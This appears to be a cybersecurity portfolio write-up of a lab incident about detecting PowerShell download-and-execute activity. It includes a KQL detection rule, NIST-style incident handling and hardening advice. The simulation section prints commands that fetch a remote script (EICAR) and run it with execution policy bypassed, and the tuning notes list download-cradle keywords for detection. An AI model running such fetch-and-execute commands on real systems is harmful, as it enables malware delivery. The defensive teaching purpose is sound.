# Scenario 2: PowerShell Suspicious Web Request

[← Back to portfolio](../../README.md)

## 📋 Incident Summary

| Field | Value |
|-------|-------|
| **Alert** | PowerShell Suspicious Web Request |
| **Affected asset** | `lamavmonboardin` |
| **User** | `lama` |
| **Data source** | Microsoft Defender for Endpoint — `DeviceProcessEvents` |
| **MITRE ATT&CK** | Execution → T1059.001 PowerShell · Command and Control → T1105 Ingress Tool Transfer |
| **Activity** | 1 script downloaded with `Invoke-WebRequest` and executed with `-ExecutionPolicy Bypass` |
| **Response** | Host isolated in MDE → anti-malware scan (clean) → released from isolation |

---

## Attack Overview

<img width="2030" height="1157" alt="PowerShell download-and-execute attack flow" src="https://github.com/user-attachments/assets/3a2f0528-9d6c-4045-abb4-8581e08ecf55" />

A post-exploitation pattern where an attacker who already has access to an endpoint uses built-in PowerShell to pull a script from the internet and run it:

1. Attacker has access to the endpoint.
2. `Invoke-WebRequest` downloads a remote script.
3. The script is saved to disk (`C:\ProgramData\`).
4. The script is executed with `-File`, bypassing execution policy.
5. The script could then reach out to a C2 server or exfiltrate data.

This is classic **living-off-the-land** behaviour: no custom tooling, only a signed Windows binary, which is why it is hard to block and important to detect.

---

## Part 1: Detection Rule

**Goal:** detect PowerShell using `Invoke-WebRequest` to download remote content.

<img width="1371" height="1219" alt="Analytics rule details" src="https://github.com/user-attachments/assets/9521c773-1741-419f-bfc6-de782af06928" />

### MITRE ATT&CK mapping

<img width="1234" height="804" alt="MITRE ATT&CK mapping in the rule" src="https://github.com/user-attachments/assets/fe8c2ad9-4954-4f2c-a7c6-a14f0a66427f" />

| Tactic | Technique | ID |
|--------|-----------|----|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Command and Control | Ingress Tool Transfer | T1105 |

### Detection query (KQL)
[`detections/02-powershell-web-request.kql`](../../detections/02-powershell-web-request.kql)

```kql
DeviceProcessEvents
| where DeviceName == "lamavmonboardin"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "invoke-webrequest"
| project
    TimeGenerated,
    DeviceName,
    AccountName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
```

> `contains` is case-insensitive in KQL, so `Invoke-WebRequest` and `invoke-webrequest` both match.

### Entity mapping

<img width="1261" height="726" alt="Entity mapping configuration" src="https://github.com/user-attachments/assets/ed99440e-9bcb-4d92-b29b-7e67de7c729a" />

Account → `AccountName` · Host → `DeviceName` · Process → `ProcessCommandLine`

---

## Part 2: Attack Simulation → Incident Created

Commands executed on the VM (the payload is the harmless **EICAR** antivirus test script):

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';

powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

<img width="2413" height="646" alt="Commands executed on the VM" src="https://github.com/user-attachments/assets/c109c781-2104-4aa2-8a86-b3e02f20c13e" />

**Log verification in Sentinel:**

<img width="2182" height="684" alt="Events in Sentinel" src="https://github.com/user-attachments/assets/49b20701-eb35-4a11-87cf-c080ccd57379" />

---

## Part 3: Working the Incident (NIST SP 800-61)

### 1. Preparation
Incident assigned to myself as SOC analyst and handled following the NIST SP 800-61 lifecycle.

### 2. Detection & Analysis
- The incident **"PowerShell Suspicious Web Request"** fired on `lamavmonboardin` for a single user, `lama`.
- Two PowerShell commands were found: one **downloaded** a script, the other **executed** it.

| Detail | Finding |
|--------|---------|
| Device | `lamavmonboardin` |
| User | `lama` |
| Scripts downloaded | 1 (`C:\programdata\eicar.ps1`) |
| Execution policy | Bypassed (`-ExecutionPolicy Bypass`) |
| User statement | Reported trying to install free software at about the same time |

**Was the script actually run?** Checked in Microsoft Defender for Endpoint:

<img width="2191" height="576" alt="Script execution confirmed" src="https://github.com/user-attachments/assets/b524e8b3-8d5b-4de8-927b-36d0de8bf7dd" />

The query confirmed that:
- the script was executed,
- by the user account `lama`,
- immediately after it was downloaded,
- and no other scripts were executed.

### 3. Containment, Eradication & Recovery
- **Containment:** device isolated with Microsoft Defender for Endpoint.
- **Eradication:** full anti-malware scan run on the isolated host. The scan came back clean.
- **Recovery:** once confirmed safe, the device was released from isolation and returned to normal use.

### 4. Post-Incident Activity
- **User awareness:** the user had been installing free software from an untrusted source. Recommend security awareness training on downloading and running unapproved software.
- **Hardening recommendations:**
  - Restrict PowerShell for standard users with **AppLocker / WDAC** or **Constrained Language Mode**.
  - Enable **PowerShell Script Block Logging** (Event ID 4104) for full visibility into script content.
  - Enable the MDE **Attack Surface Reduction (ASR)** rule *"Block execution of potentially obfuscated scripts"*.
  - Enforce software installation through an approved catalogue only.

### Closure

<img width="866" height="964" alt="Incident closure" src="https://github.com/user-attachments/assets/dee2d2e5-f084-4169-9141-2d85a6c0e0af" />

---

## 🔧 Detection Tuning Notes

- **Remove the hard-coded device.** `DeviceName == "lamavmonboardin"` was right for the lab. In production the rule should cover every device.
- **Cover the aliases.** Attackers rarely type `Invoke-WebRequest` in full. Also match `iwr`, `Invoke-RestMethod`, `Net.WebClient`, `DownloadString`, `DownloadFile`, `Start-BitsTransfer`, and `pwsh.exe`. See the broader hunting query in [`detections/02-powershell-web-request.kql`](../../detections/02-powershell-web-request.kql).
- **Flag risky combinations.** `-ExecutionPolicy Bypass`, `-EncodedCommand`, `-WindowStyle Hidden` or `-NoProfile` together with a download deserve a higher severity.
- **Correlate with the network.** Join with `DeviceNetworkEvents` to see the destination domain and IP the script contacted.
